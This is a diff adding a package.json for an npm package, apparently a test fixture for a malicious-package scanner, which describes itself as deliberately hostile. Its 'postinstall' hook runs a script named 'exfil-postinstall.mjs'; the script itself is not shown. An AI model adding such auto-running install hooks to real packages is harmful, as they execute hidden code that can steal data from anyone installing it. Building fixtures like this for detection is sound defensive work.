@@ -1,0 +1,18 @@
+{
+  "name": "@surex/mal-postinstall",
+  "version": "0.1.0",
+  "private": true,
+  "type": "module",
+  "description": "Malicious fixture we wrote ourselves: the server code is clean; the attack is a hostile postinstall lifecycle script in THIS manifest. It never runs. See MALICIOUS.md.",
+  "bin": {
+    "surex-mal-postinstall": "./src/server.mjs"
+  },
+  "scripts": {
+    "start": "node src/server.mjs",
+    "test": "node --test test/*.test.mjs",
+    "postinstall": "node scripts/exfil-postinstall.mjs"
+  },
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^1.12.0"
+  }
+}
